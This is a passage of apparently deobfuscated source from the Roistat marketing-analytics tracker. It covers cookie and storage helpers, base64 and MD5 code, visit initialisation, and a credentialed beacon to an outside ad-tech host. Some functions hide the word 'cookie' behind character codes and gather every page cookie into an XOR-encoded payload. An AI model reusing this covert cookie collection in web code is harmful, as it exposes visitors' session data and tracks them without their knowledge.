    var dR = M.cookie.match(new RegExp("(?:^|; )" + dQ.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"));
    return dR ? aK(dR[1]) : bO;
  };
  dN = function (e, dW, dX) {
    var dU = cr(e);
    dX = dX || {};
    var dS = dX.expires;
    if (typeof dS == "number" && dS) {
      var dV = new Date();
      dV.setTime(dV.getTime() + dS * 1000);
      dS = dX.expires = dV;
    }
    if (dS && dS.toUTCString) {
      dX.expires = dS.toUTCString();
    }
    dW = encodeURIComponent(dW);
    var dQ = dU + "=" + dW;
    for (var dT in dX) {
      dQ += "; " + dT;
      var dR = dX[dT];
      if (dR !== true) {
        dQ += "=" + dR;
      }
    }
    M.cookie = dQ;
  };
  dA = cv.roistatSetCookie = function dA(dQ, dT, e) {
    dN(dQ, dT, e);
    var dS;
    dS = j(aU);
    dS = a8(dS) ? dS.split(",") : [];
    for (var dR in dS) {
      if (dS[dR] === dQ) {
        return;
      }
    }
    dS.push(dQ);
    dN(aU, dS.join(","), {
      path: "/"
    });
  };
  var bM = function (dQ, dS, dR) {
    var e = dQ[dS];
    dQ[dS] = function () {
      if (e) {
        e.apply(this, arguments);
      }
      dR.apply(this, arguments);
    };
  };
  var am = function (dR, dQ, dS) {
    if (dR.addEventListener) {
      dR.addEventListener(dQ, dS, false);
      return;
    }
    var e = "on" + dQ;
    if (dR.attachEvent) {
      dR.attachEvent(e, dS);
      return;
    }
    if (e in dR) {
      bM(dR, e, dS);
      return;
    }
    if (dQ in dR) {
      bM(dR, dQ, dS);
      return;
    }
    A("Handler could not be attached");
  };
  var r = function (dS, dR) {
    var dQ = dS.length;
    for (var e = 0; e < dQ; e++) {
      dR(dS[e]);
    }
  };
  var P = function (e) {
    var dQ = [];
    bv(e, function (dR, dS) {
      dQ.push(dR);
    });
    return dQ;
  };
  var bv = function (e, dR) {
    for (var dQ in e) {
      if (Object.prototype.hasOwnProperty.call(e, dQ)) {
        dR(dQ, e[dQ]);
      }
    }
  };
  var bC = function (e) {
    return Object.prototype.toString.call(e) === "[object Array]";
  };
  var aX = function (dQ) {
    if (typeof dQ !== "object") {
      return false;
    }
    for (var e in dQ) {
      if (dQ.hasOwnProperty(e)) {
        return true;
      }
    }
    return false;
  };
  var ds = function (dR) {
    try {
      var dQ = JSON.parse(dR);
      if (dQ && typeof dQ === "object") {
        return dQ;
      }
    } catch (dS) {}
    return null;
  };
  if (M.getElementsByClassName == bO) {
    M.getElementsByClassName = function (dQ) {
      var e = [];
      var dU = new RegExp("\\b" + dQ + "\\b");
      var dT = this.getElementsByTagName("*");
      for (var dS = 0; dS < dT.length; dS++) {
        var dR = dT[dS].className;
        if (dU.test(dR)) {
          e.push(dT[dS]);
        }
      }
      return e;
    };
  }
  var aM = function () {
    return String.fromCharCode;
  };
  var c3 = function (dR) {
    var e = "";
    for (var dQ = 0; dQ < dR.length; ++dQ) {
      e += aM()(c5 ^ dR.charCodeAt(dQ));
    }
    return e;
  };
  var aT = function (e) {
    return encodeURIComponent(c3(cy.encode(e)));
  };
  var cy = {
    _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
    encode: function (dR) {
      var e = "";
      var dY, dW, dU, dX, dV, dT, dS;
      var dQ = 0;
      dR = cy._utf8_encode(dR);
      while (dQ < dR.length) {
        dY = dR.charCodeAt(dQ++);
        dW = dR.charCodeAt(dQ++);
        dU = dR.charCodeAt(dQ++);
        dX = dY >> 2;
        dV = (dY & 3) << 4 | dW >> 4;
        dT = (dW & 15) << 2 | dU >> 6;
        dS = dU & 63;
        if (isNaN(dW)) {
          dT = dS = 64;
        } else {
          if (isNaN(dU)) {
            dS = 64;
          }
        }
        e = e + this._keyStr.charAt(dX) + this._keyStr.charAt(dV) + this._keyStr.charAt(dT) + this._keyStr.charAt(dS);
      }
      return e;
    },
    decode: function (dR) {
      var e = "";
      var dY, dW, dU;
      var dX, dV, dT, dS;
      var dQ = 0;
      dR = dR.replace(/[^A-Za-z0-9\+\/\=]/g, "");
      while (dQ < dR.length) {
        dX = this._keyStr.indexOf(dR.charAt(dQ++));
        dV = this._keyStr.indexOf(dR.charAt(dQ++));
        dT = this._keyStr.indexOf(dR.charAt(dQ++));
        dS = this._keyStr.indexOf(dR.charAt(dQ++));
        dY = dX << 2 | dV >> 4;
        dW = (dV & 15) << 4 | dT >> 2;
        dU = (dT & 3) << 6 | dS;
        e = e + String.fromCharCode(dY);
        if (dT != 64) {
          e = e + String.fromCharCode(dW);
        }
        if (dS != 64) {
          e = e + String.fromCharCode(dU);
        }
      }
      e = cy._utf8_decode(e);
      return e;
    },
    _utf8_encode: function (dQ) {
      dQ = dQ.replace(/\r\n/g, "\n");
      var e = "";
      for (var dS = 0; dS < dQ.length; dS++) {
        var dR = dQ.charCodeAt(dS);
        if (dR < 128) {
          e += String.fromCharCode(dR);
        } else {
          if (dR > 127 && dR < 2048) {
            e += String.fromCharCode(dR >> 6 | 192);
            e += String.fromCharCode(dR & 63 | 128);
          } else {
            e += String.fromCharCode(dR >> 12 | 224);
            e += String.fromCharCode(dR >> 6 & 63 | 128);
            e += String.fromCharCode(dR & 63 | 128);
          }
        }
      }
      return e;
    },
    _utf8_decode: function (e) {
      var dR = "";
      var dT = 0;
      var dU = 0;
      var dS = 0;
      var dQ = 0;
      while (dT < e.length) {
        dU = e.charCodeAt(dT);
        if (dU < 128) {
          dR += String.fromCharCode(dU);
          dT++;
        } else {
          if (dU > 191 && dU < 224) {
            dS = e.charCodeAt(dT + 1);
            dR += String.fromCharCode((dU & 31) << 6 | dS & 63);
            dT += 2;
          } else {
            dS = e.charCodeAt(dT + 1);
            dQ = e.charCodeAt(dT + 2);
            dR += String.fromCharCode((dU & 15) << 12 | (dS & 63) << 6 | dQ & 63);
            dT += 3;
          }
        }
      }
      return dR;
    }
  };
  var bW = bW || function (d1, dR) {
    var dT = {},
      dU = dT.lib = {},
      dS = function () {},
      e = dU.Base = {
        extend: function (d2) {
          dS.prototype = this;
          var d3 = new dS();
          d2 && d3.mixIn(d2);
          d3.hasOwnProperty("init") || (d3.init = function () {
            d3.$super.init.apply(this, arguments);
          });
          d3.init.prototype = d3;
          d3.$super = this;
          return d3;
        },
        create: function () {
          var d2 = this.extend();
          d2.init.apply(d2, arguments);
          return d2;
        },
        init: function () {},
        mixIn: function (d2) {
          for (var d3 in d2) {
            d2.hasOwnProperty(d3) && (this[d3] = d2[d3]);
          }
          d2.hasOwnProperty("toString") && (this.toString = d2.toString);
        },
        clone: function () {
          return this.init.prototype.extend(this);
        }
      },
      dQ = dU.WordArray = e.extend({
        init: function (d2, d3) {
          d2 = this.words = d2 || [];
          this.sigBytes = d3 != dR ? d3 : 4 * d2.length;
        },
        toString: function (d2) {
          return (d2 || d0).stringify(this);
        },
        concat: function (d2) {
          var d5 = this.words,
            d3 = d2.words,
            d4 = this.sigBytes;
          d2 = d2.sigBytes;
          this.clamp();
          if (d4 % 4) {
            for (var d6 = 0; d6 < d2; d6++) {
              d5[d4 + d6 >>> 2] |= (d3[d6 >>> 2] >>> 24 - 8 * (d6 % 4) & 255) << 24 - 8 * ((d4 + d6) % 4);
            }
          } else {
            if (65535 < d3.length) {
              for (d6 = 0; d6 < d2; d6 += 4) {
                d5[d4 + d6 >>> 2] = d3[d6 >>> 2];
              }
            } else {
              d5.push.apply(d5, d3);
            }
          }
          this.sigBytes += d2;
          return this;
        },
        clamp: function () {
          var d2 = this.words,
            d3 = this.sigBytes;
          d2[d3 >>> 2] &= 4294967295 << 32 - 8 * (d3 % 4);
          d2.length = d1.ceil(d3 / 4);
        },
        clone: function () {
          var d2 = e.clone.call(this);
          d2.words = this.words.slice(0);
          return d2;
        },
        random: function (d2) {
          for (var d4 = [], d3 = 0; d3 < d2; d3 += 4) {
            d4.push(4294967296 * d1.random() | 0);
          }
          return new dQ.init(d4, d2);
        }
      }),
      dY = dT.enc = {},
      d0 = dY.Hex = {
        stringify: function (d2) {
          var d3 = d2.words;
          d2 = d2.sigBytes;
          for (var d6 = [], d5 = 0; d5 < d2; d5++) {
            var d4 = d3[d5 >>> 2] >>> 24 - 8 * (d5 % 4) & 255;
            d6.push((d4 >>> 4).toString(16));
            d6.push((d4 & 15).toString(16));
          }
          return d6.join("");
        },
        parse: function (d2) {
          for (var d3 = d2.length, d5 = [], d4 = 0; d4 < d3; d4 += 2) {
            d5[d4 >>> 3] |= parseInt(d2.substr(d4, 2), 16) << 24 - 4 * (d4 % 8);
          }
          return new dQ.init(d5, d3 / 2);
        }
      },
      dX = dY.Latin1 = {
        stringify: function (d2) {
          var d3 = d2.words;
          d2 = d2.sigBytes;
          for (var d5 = [], d4 = 0; d4 < d2; d4++) {
            d5.push(String.fromCharCode(d3[d4 >>> 2] >>> 24 - 8 * (d4 % 4) & 255));
          }
          return d5.join("");
        },
        parse: function (d2) {
          for (var d3 = d2.length, d5 = [], d4 = 0; d4 < d3; d4++) {
            d5[d4 >>> 2] |= (d2.charCodeAt(d4) & 255) << 24 - 8 * (d4 % 4);
          }
          return new dQ.init(d5, d3);
        }
      },
      dZ = dY.Utf8 = {
        stringify: function (d2) {
          try {
            return decodeURIComponent(escape(dX.stringify(d2)));
          } catch (d3) {
            throw Error("Malformed UTF-8 data");
          }
        },
        parse: function (d2) {
          return dX.parse(unescape(encodeURIComponent(d2)));
        }
      },
      dW = dU.BufferedBlockAlgorithm = e.extend({
        reset: function () {
          this._data = new dQ.init();
          this._nDataBytes = 0;
        },
        _append: function (d2) {
          "string" == typeof d2 && (d2 = dZ.parse(d2));
          this._data.concat(d2);
          this._nDataBytes += d2.sigBytes;
        },
        _process: function (d3) {
          var d5 = this._data,
            d8 = d5.words,
            d7 = d5.sigBytes,
            d6 = this.blockSize,
            d2 = d7 / (4 * d6),
            d2 = d3 ? d1.ceil(d2) : d1.max((d2 | 0) - this._minBufferSize, 0);
          d3 = d2 * d6;
          d7 = d1.min(4 * d3, d7);
          if (d3) {
            for (var d4 = 0; d4 < d3; d4 += d6) {
              this._doProcessBlock(d8, d4);
            }
            d4 = d8.splice(0, d3);
            d5.sigBytes -= d7;
          }
          return new dQ.init(d4, d7);
        },
        clone: function () {
          var d2 = e.clone.call(this);
          d2._data = this._data.clone();
          return d2;
        },
        _minBufferSize: 0
      });
    dU.Hasher = dW.extend({
      cfg: e.extend(),
      init: function (d2) {
        this.cfg = this.cfg.extend(d2);
        this.reset();
      },
      reset: function () {
        dW.reset.call(this);
        this._doReset();
      },
      update: function (d2) {
        this._append(d2);
        this._process();
        return this;
      },
      finalize: function (d2) {
        d2 && this._append(d2);
        return this._doFinalize();
      },
      blockSize: 16,
      _createHelper: function (d2) {
        return function (d3, d4) {
          return new d2.init(d4).finalize(d3);
        };
      },
      _createHmacHelper: function (d2) {
        return function (d3, d4) {
          return new dV.HMAC.init(d2, d4).finalize(d3);
        };
      }
    });
    var dV = dT.algo = {};
    return dT;
  }(Math);
  (function (dZ) {
    function dR(d3, d4, d1, d6, d2, d5, d0) {
      d3 = d3 + (d4 & d1 | ~d4 & d6) + d2 + d0;
      return (d3 << d5 | d3 >>> 32 - d5) + d4;
    }
    function dT(d3, d4, d1, d6, d2, d5, d0) {
      d3 = d3 + (d4 & d6 | d1 & ~d6) + d2 + d0;
      return (d3 << d5 | d3 >>> 32 - d5) + d4;
    }
    function dU(d3, d4, d1, d6, d2, d5, d0) {
      d3 = d3 + (d4 ^ d1 ^ d6) + d2 + d0;
      return (d3 << d5 | d3 >>> 32 - d5) + d4;
    }
    function dS(d3, d4, d1, d6, d2, d5, d0) {
      d3 = d3 + (d1 ^ (d4 | ~d6)) + d2 + d0;
      return (d3 << d5 | d3 >>> 32 - d5) + d4;
    }
    for (var e = bW, dQ = e.lib, dW = dQ.WordArray, dY = dQ.Hasher, dQ = e.algo, dV = [], dX = 0; 64 > dX; dX++) {
      dV[dX] = 4294967296 * dZ.abs(dZ.sin(dX + 1)) | 0;
    }
    dQ = dQ.MD5 = dY.extend({
      _doReset: function () {
        this._hash = new dW.init([1732584193, 4023233417, 2562383102, 271733878]);
      },
      _doProcessBlock: function (eh, ee) {
        for (var em = 0; 16 > em; em++) {
          var eg = ee + em,
            d3 = eh[eg];
          eh[eg] = (d3 << 8 | d3 >>> 24) & 16711935 | (d3 << 24 | d3 >>> 8) & 4278255360;
        }
        var em = this._hash.words,
          eg = eh[ee + 0],
          d3 = eh[ee + 1],
          ef = eh[ee + 2],
          ec = eh[ee + 3],
          ea = eh[ee + 4],
          d8 = eh[ee + 5],
          d6 = eh[ee + 6],
          d5 = eh[ee + 7],
          d4 = eh[ee + 8],
          d2 = eh[ee + 9],
          d1 = eh[ee + 10],
          d0 = eh[ee + 11],
          ed = eh[ee + 12],
          eb = eh[ee + 13],
          d9 = eh[ee + 14],
          d7 = eh[ee + 15],
          el = em[0],
          ek = em[1],
          ej = em[2],
          ei = em[3],
          el = dR(el, ek, ej, ei, eg, 7, dV[0]),
          ei = dR(ei, el, ek, ej, d3, 12, dV[1]),
          ej = dR(ej, ei, el, ek, ef, 17, dV[2]),
          ek = dR(ek, ej, ei, el, ec, 22, dV[3]),
          el = dR(el, ek, ej, ei, ea, 7, dV[4]),
          ei = dR(ei, el, ek, ej, d8, 12, dV[5]),
          ej = dR(ej, ei, el, ek, d6, 17, dV[6]),
          ek = dR(ek, ej, ei, el, d5, 22, dV[7]),
          el = dR(el, ek, ej, ei, d4, 7, dV[8]),
          ei = dR(ei, el, ek, ej, d2, 12, dV[9]),
          ej = dR(ej, ei, el, ek, d1, 17, dV[10]),
          ek = dR(ek, ej, ei, el, d0, 22, dV[11]),
          el = dR(el, ek, ej, ei, ed, 7, dV[12]),
          ei = dR(ei, el, ek, ej, eb, 12, dV[13]),
          ej = dR(ej, ei, el, ek, d9, 17, dV[14]),
          ek = dR(ek, ej, ei, el, d7, 22, dV[15]),
          el = dT(el, ek, ej, ei, d3, 5, dV[16]),
          ei = dT(ei, el, ek, ej, d6, 9, dV[17]),
          ej = dT(ej, ei, el, ek, d0, 14, dV[18]),
          ek = dT(ek, ej, ei, el, eg, 20, dV[19]),
          el = dT(el, ek, ej, ei, d8, 5, dV[20]),
          ei = dT(ei, el, ek, ej, d1, 9, dV[21]),
          ej = dT(ej, ei, el, ek, d7, 14, dV[22]),
          ek = dT(ek, ej, ei, el, ea, 20, dV[23]),
          el = dT(el, ek, ej, ei, d2, 5, dV[24]),
          ei = dT(ei, el, ek, ej, d9, 9, dV[25]),
          ej = dT(ej, ei, el, ek, ec, 14, dV[26]),
          ek = dT(ek, ej, ei, el, d4, 20, dV[27]),
          el = dT(el, ek, ej, ei, eb, 5, dV[28]),
          ei = dT(ei, el, ek, ej, ef, 9, dV[29]),
          ej = dT(ej, ei, el, ek, d5, 14, dV[30]),
          ek = dT(ek, ej, ei, el, ed, 20, dV[31]),
          el = dU(el, ek, ej, ei, d8, 4, dV[32]),
          ei = dU(ei, el, ek, ej, d4, 11, dV[33]),
          ej = dU(ej, ei, el, ek, d0, 16, dV[34]),
          ek = dU(ek, ej, ei, el, d9, 23, dV[35]),
          el = dU(el, ek, ej, ei, d3, 4, dV[36]),
          ei = dU(ei, el, ek, ej, ea, 11, dV[37]),
          ej = dU(ej, ei, el, ek, d5, 16, dV[38]),
          ek = dU(ek, ej, ei, el, d1, 23, dV[39]),
          el = dU(el, ek, ej, ei, eb, 4, dV[40]),
          ei = dU(ei, el, ek, ej, eg, 11, dV[41]),
          ej = dU(ej, ei, el, ek, ec, 16, dV[42]),
          ek = dU(ek, ej, ei, el, d6, 23, dV[43]),
          el = dU(el, ek, ej, ei, d2, 4, dV[44]),
          ei = dU(ei, el, ek, ej, ed, 11, dV[45]),
          ej = dU(ej, ei, el, ek, d7, 16, dV[46]),
          ek = dU(ek, ej, ei, el, ef, 23, dV[47]),
          el = dS(el, ek, ej, ei, eg, 6, dV[48]),
          ei = dS(ei, el, ek, ej, d5, 10, dV[49]),
          ej = dS(ej, ei, el, ek, d9, 15, dV[50]),
          ek = dS(ek, ej, ei, el, d8, 21, dV[51]),
          el = dS(el, ek, ej, ei, ed, 6, dV[52]),
          ei = dS(ei, el, ek, ej, ec, 10, dV[53]),
          ej = dS(ej, ei, el, ek, d1, 15, dV[54]),
          ek = dS(ek, ej, ei, el, d3, 21, dV[55]),
          el = dS(el, ek, ej, ei, d4, 6, dV[56]),
          ei = dS(ei, el, ek, ej, d7, 10, dV[57]),
          ej = dS(ej, ei, el, ek, d6, 15, dV[58]),
          ek = dS(ek, ej, ei, el, eb, 21, dV[59]),
          el = dS(el, ek, ej, ei, ea, 6, dV[60]),
          ei = dS(ei, el, ek, ej, d0, 10, dV[61]),
          ej = dS(ej, ei, el, ek, ef, 15, dV[62]),
          ek = dS(ek, ej, ei, el, d2, 21, dV[63]);
        em[0] = em[0] + el | 0;
        em[1] = em[1] + ek | 0;
        em[2] = em[2] + ej | 0;
        em[3] = em[3] + ei | 0;
      },
      _doFinalize: function () {
        var d2 = this._data,
          d3 = d2.words,
          d0 = 8 * this._nDataBytes,
          d4 = 8 * d2.sigBytes;
        d3[d4 >>> 5] |= 128 << 24 - d4 % 32;
        var d1 = dZ.floor(d0 / 4294967296);
        d3[(d4 + 64 >>> 9 << 4) + 15] = (d1 << 8 | d1 >>> 24) & 16711935 | (d1 << 24 | d1 >>> 8) & 4278255360;
        d3[(d4 + 64 >>> 9 << 4) + 14] = (d0 << 8 | d0 >>> 24) & 16711935 | (d0 << 24 | d0 >>> 8) & 4278255360;
        d2.sigBytes = 4 * (d3.length + 1);
        this._process();
        d2 = this._hash;
        d3 = d2.words;
        for (d0 = 0; 4 > d0; d0++) {
          d4 = d3[d0], d3[d0] = (d4 << 8 | d4 >>> 24) & 16711935 | (d4 << 24 | d4 >>> 8) & 4278255360;
        }
        return d2;
      },
      clone: function () {
        var d0 = dY.clone.call(this);
        d0._hash = this._hash.clone();
        return d0;
      }
    });
    e.MD5 = dY._createHelper(dQ);
    e.HmacMD5 = dY._createHmacHelper(dQ);
  })(Math);
  var bK = function () {
    return M[aM()(99, 111, 111, 107, 105, 101)];
  };
  var ay = function () {
    dE();
    var e = {
      c: dk()
    };
    return aT(JSON.stringify(e));
  };
  var cM = function () {
    var e = p();
    return e === bO || e === null ? cB : e;
  };
  var dk = function () {
    var e = [];
    for (var dQ in cn.cookies) {
      if (!Object.prototype.hasOwnProperty.call(cn.cookies, dQ)) {
        continue;
      }
      e.push(dQ + "=" + cn.cookies[dQ]);
    }
    return e.join("; ");
  };
  var dE = function () {
    var e = n();
    for (var dQ in e) {
      if (!Object.prototype.hasOwnProperty.call(e, dQ)) {
        continue;
      }
      cn.cookies[dQ] = e[dQ];
    }
  };
  var aw = function (e) {
    dA(df, e, bI());
    cn.source.marker = e;
  };
  var at = function () {
    return j(df);
  };
  var g = function () {
    bv(cv.roistat.page.params, function (dQ, e) {
      cn.pageParams[dQ] = e;
    });
  };
  var n = function () {
    var dS = bK();
    var dT = dS.split("; ");
    var e = {};
    for (var dR = 0; dR < dT.length; dR++) {
      var dW = dT[dR];
      if (dW === "") {
        continue;
      }
      var dQ = dW.split("=");
      if (dQ.length < 2) {
        continue;
      }
      var dV = dQ[0].trim();
      var dU = dQ[1].trim();
      e[dV] = dU;
    }
    return e;
  };
  var h = function () {
    return aM()(104, 97, 115, 104);
  };
  var aS = function (e) {
    return e.split("http://").join("").split("https://").join("").split("#")[0].split("?")[0].split("www.").join("").replace(/\/+$/, "");
  };
  var ci = {
    isAvailable: function () {
      var dQ = false;
      if (!cv.sessionStorage || !cv.sessionStorage.setItem || !cv.sessionStorage.getItem || !cv.sessionStorage.removeItem) {
        return dQ;
      }
      try {
        cv.sessionStorage.setItem("testKey", "testValue");
        dQ = cv.sessionStorage.getItem("testKey") === "testValue";
        cv.sessionStorage.removeItem("testKey");
      } catch (dR) {
        return false;
      }
      return dQ;
    },
    remove: function (e) {
      if (this.isAvailable()) {
        cv.sessionStorage.removeItem(cr(e));
      }
    },
    setObject: function (e, dQ) {
      if (this.isAvailable()) {
        cv.sessionStorage.setItem(cr(e), JSON.stringify(dQ));
      }
    },
    getObject: function (dQ) {
      var e = null;
      if (this.isAvailable()) {
        e = cv.sessionStorage.getItem(cr(dQ));
        e = JSON.parse(e);
      }
      return e;
    },
    set: function (e, dQ) {
      if (this.isAvailable()) {
        cv.sessionStorage.setItem(cr(e), dQ);
      }
    },
    get: function (dQ) {
      var e = null;
      if (this.isAvailable()) {
        e = cv.sessionStorage.getItem(cr(dQ));
      }
      return e;
    }
  };
  var cs = {
    isAvailable: function () {
      var dQ = false;
      if (!cv.localStorage || !cv.localStorage.setItem || !cv.localStorage.getItem || !cv.localStorage.removeItem) {
        return dQ;
      }
      try {
        cv.localStorage.setItem("testKey", "testValue");
        dQ = cv.localStorage.getItem("testKey") === "testValue";
        cv.localStorage.removeItem("testKey");
      } catch (dR) {
        return false;
      }
      return dQ;
    },
    remove: function (dQ) {
      if (this.isAvailable()) {
        cv.localStorage.removeItem(cr(dQ));
      } else {
        var e = new Date(1970, 1, 1);
        dA(dQ, "", {
          expires: e.toUTCString()
        });
      }
    },
    setObject: function (e, dQ) {
      if (this.isAvailable()) {
        localStorage.setItem(cr(e), JSON.stringify(dQ));
      }
    },
    getObject: function (dQ) {
      var e = null;
      if (this.isAvailable()) {
        e = localStorage.getItem(cr(dQ));
        e = ds(e);
      }
      return e;
    },
    set: function (e, dQ) {
      if (this.isAvailable()) {
        localStorage.setItem(cr(e), dQ);
      } else {
        if (this.isSaveInCookieEnabled()) {
          dA(e, dQ, c7);
        }
      }
    },
    save: function (dQ, dR, e) {
      if (this.isAvailable()) {
        localStorage.setItem(cr(dQ), dR);
      }
      dA(dQ, dR, e);
    },
    get: function (dQ) {
      var e = null;
      if (this.isAvailable()) {
        e = localStorage.getItem(cr(dQ));
      }
      if (e === null) {
        e = j(dQ);
      }
      return e;
    },
    isSaveInCookieEnabled: function () {
      return this.get(bm) > 0;
    },
    isExternalCountersEnabled: function () {
      return this.get(E) > 0;
    }
  };
  var ce = function () {
    return !cd(M.referrer) ? M.referrer : null;
  };
  var Y = function (e) {
    return typeof e === "function";
  };
  var dM = function (e) {
    return typeof e === "object";
  };
  var a8 = function (e) {
    return typeof e === "string";
  };
  var ae = function (dS, dR) {
    dR = typeof dR !== "undefined" ? dR : false;
    var dT = function (dW) {
      var dV = null;
      var dX = new RegExp("[#&?](" + dS + "=[^#&?]+)");
      if (dX.test(dW)) {
        dV = RegExp.$1.substring(RegExp.$1.indexOf("=") + 1);
      }
      var dU = aK(dV);
      return dV && dU ? dU : dV;
    };
    var e = dT(cJ);
    if (dR) {
      var dQ = M.referrer;
      if (e === null && dQ) {
        e = dT(dQ);
      }
    }
    return e;
  };
  var dj = function (dQ, dR) {
    var e = false;
    if (dQ && dR) {
      e = dQ.split(dR).join("") !== dQ;
    }
    return e;
  };
  if (ae(cm) === "1" || n()[cm] === "1") {
    bA = true;
  }
  var cW = function () {
    return true;
  };
  var aQ = function () {
    return cW() ? cv.roistatMultiWidgetOnly : cv.roistatOnlineChatOnly;
  };
  var dD = function () {
    var dQ = bd() === "86ee03e4ba0f978620d7a0ee0e2e51dc" || bd() === "4";
    var e = (cv.location.host === "cloud.roistat.com" || cv.location.host === "cloud-eu.roistat.com") && cv.location.pathname !== "/user/login" && cv.location.pathname !== "/user/register";
    var dS = bd() === "349ac99f64416756d4a18e91c71dc95f";
    var dR = cv.location.host === "datyson.ru" && cv.location.pathname === "/cloud.html";
    if (dQ && !e || dS && !dR) {
      A("Current project is Roistat but page is not cloud.roistat.com. Drop init multiwidget");
      return true;
    }
    return false;
  };
  var bi = function () {
    if ("https:" === M.location.protocol) {
      return "https:";
    } else {
      return "http:";
    }
  };
  var X = function (dQ) {
    var e = M.createElement("img");
    e.src = dQ;
    A("sendRequestByUrl: " + dQ);
  };
  var a4 = function (dQ, dS) {
    A("sendApiRequestJSONP: init with url " + dQ);
    var e = M.createElement("script");
    e.onload = e.onreadystatechange = function () {
      var dT = this.readyState ? this.readyState : "unknown";
      A("sendApiRequestJSONP: script state changed to " + dT);
    };
    e.src = dQ;
    if (dS) {
      e.setAttribute("data-roistat-script-id", dS);
    }
    e.type = "text/javascript";
    e.async = true;
    var dR = M.getElementsByTagName("script")[0];
    dR.parentNode.insertBefore(e, dR);
    A("sendApiRequestJSONP: script appended");
  };
  var b7 = function () {
    if (cn.isCssLoaded) {
      return;
    }
    (function () {
      var dQ = M.createElement("link"),
        e = M.getElementsByTagName("head");
      dQ.setAttribute("rel", "stylesheet");
      dQ.setAttribute("href", bi() + "//" + x + "/dist/module.css?" + ab);
      if (e.length > 0) {
        cn.isCssLoaded = true;
        e[0].appendChild(dQ);
      }
    })();
  };
  var cx = function () {
    return cC() || dK();
  };
  var cC = function () {
    return bq() !== null;
  };
  var dK = function () {
    return cu() !== null;
  };
  var dd = function () {
    var e = da();
    if (e !== null) {
      dA(cl, e, bI());
    }
  };
  var da = function () {
    return bq() || cu() || null;
  };
  var bq = function () {
    return ae("roistat_visit");
  };
  var cu = function () {
    return cn.visitFromUser;
  };
  var a = function (dQ, e) {
    if (!e && (cn.isSettingsUpdating || !M.hasFocus())) {
      A("Already updating settings or document not in focus, return");
      return;
    }
    var dR = S() + "/get-settings?v=" + ab + "&visit=" + dQ;
    A("Request new settings");
    cn.isSettingsUpdating = true;
    a4(dR);
  };
  var a0 = function () {
    return cs.get(a9) > 0;
  };
  var du = function () {
    cs.set(a9, 1);
  };
  var aF = function () {
    cs.remove(b9);
    cs.remove(bD);
    cs.remove(b8);
    cs.remove(bz);
    cs.remove(D);
    cs.remove(cZ);
    cs.remove(dg);
    cs.remove(f);
  };
  var co = function () {
    var dT = function () {
      return cs.get(cO);
    };
    var dS = function () {
      cs.set(cO, B);
    };
    var dQ = function () {
      return typeof dT() === "string";
    };
    var e = function () {
      var dU = Number(dT()) > B;
      A("Settings Version: settings version change status - " + dU);
      return dU;
    };
    var dR = function () {
      var dU = 1000 * 60 * 60 * 24;
      var dX = dp();
      var dW = cz() - dX;
      var dV = dW > dU;
      A("Settings Version:: expiration day check: lastUpdateTime=" + dX + ", _lastUpdateTimeDiff=" + dW + ", _oneDayDiffInMs=" + dU + ", result=" + (dV ? 1 : 0));
      return dV;
    };
    if (!dQ()) {
      A("Settings Version: set settings version up to 1");
      dS();
    }
    if (dR() || e()) {
      A("Settings Version: clear settings");
      aF();
    }
  };
  var dF = function () {
    A("Call: Init");
    A("Counter version: " + ab);
    if (ae("roistat_ab_demo") === "1") {
      A("Roistat initialisation rejected: ab test preview mode");
      return;
    }
    bt();
    cV();
    if ((!av() || dL()) && !aQ()) {
      de = true;
      bR();
      I("Created new visit_id: " + p() + " and referrer: " + l);
    } else {
      co();
      dd();
      var dQ = p();
      I("Init visit with new visit_id, visit_id: " + dQ + " and referrer: " + l);
      bY();
      bg();
      db();
      roistat.visit = dQ;
      cn.source.marker = at();
      cv.roistat.geo = cs.getObject(m);
      var dR = a0();
      if (!dR) {
        a(dQ);
      } else {
        c1();
      }
    }
    cL(dt);
    cL(dO);
    var e = bd() === "86ee03e4ba0f978620d7a0ee0e2e51dc" || bd() === "4";
    if (e) {
      cL(roistat.setDeviceParams);
    }
  };
  var dt = function () {
    A("InitExternalCounter");
    if (!cs.isExternalCountersEnabled()) {
      A("ExternalCounters is not available, return");
      return;
    }
    var dR = bd();
    var dQ = J();
    var dU = dQ ? dQ : p();
    var dT = dR + ":" + dU;
    var e = dR + ":" + bW.MD5(bh(M.domain)).toString();
    var dS = function (dX, dV) {
      var dW = (M.location.protocol === "https:" ? "https:" : "http:") + "//tech.rtb.mts.ru/roistat?landing=" + dV + "&event_type=view&user_id=" + dX;
      var dY = new XMLHttpRequest();
      dY.open("GET", dW, true);
      dY.withCredentials = true;
      dY.onload = function () {
        if (dY.readyState === 4) {
          if (dY.status !== 204) {
            console.error(dY.statusText);
          }
        }
      };
      dY.onerror = function () {
        console.error(dY.statusText);
      };
      dY.send(null);
    };
    dS(dT, e);
    A("InitExternalCounter: script appended");
  };
  var Q = function (dR) {
    if (!dR.isEnabled) {
      return true;
    }
    var e = new Date();
    var dY = new Date().toISOString();
    var dV = e.getUTCDay() === 0 ? 7 : e.getDay();
    var dW = dV === 6 || dV === 7;
    var dX = false;
    for (var dT = 0; dT < dR.days.length; dT++) {
      if (dV === dR.days[dT]) {
        dX = true;
      }
    }
    if (!dX) {
      return false;
    }
    if (dW && dR.weekendsTime !== null) {
      var dZ = new Date(dR.weekendsTime.from).toISOString();
      var dS = new Date(dR.weekendsTime.to).toISOString();
      return dY >= dZ && dY <= dS;
    }
    var dU = new Date(dR.weekdaysTime.from).toISOString();
    var dQ = new Date(dR.weekdaysTime.to).toISOString();
    return dY >= dU && dY <= dQ;
  };
  var bt = function () {
    A("Call: initMarker");
    bG = cA();
    A("Call: inited marker: " + bG);
  };
  var cV = function () {
    A("Call: initReferrer");
    l = ce();
    A("Call: end initReferrer: " + l);
  };
  var dO = function () {
    A("Call: parsing roistat params from url");
    var dR = {};
    for (i = 1; i <= dn; i++) {
      var dQ = "roistat_param" + i;
      dR[dQ] = ae(dQ, false);
    }
    var e = bc(dR);
    if (aX(e) && Object.keys(e).length > 0) {
      bj(e);
    }
    A("Call: end parsing roistat params from url");
  };
  var cd = function (dR) {
    if (!dR) {
      return true;
    }
    var e = bh(dR);
    var dQ = bh(M.domain);
    if (e === dQ) {
      return true;
    }
    var dS = b6();
    if (dS === null) {
      return false;
    }
    if (dj(e, dS) && dj(dQ, dS)) {
      return true;
    }
    return false;
  };
  var b6 = function () {
    if (typeof c7.domain === "string" && c7.domain !== "") {
      return bh(c7.domain);
    }
    return null;
  };
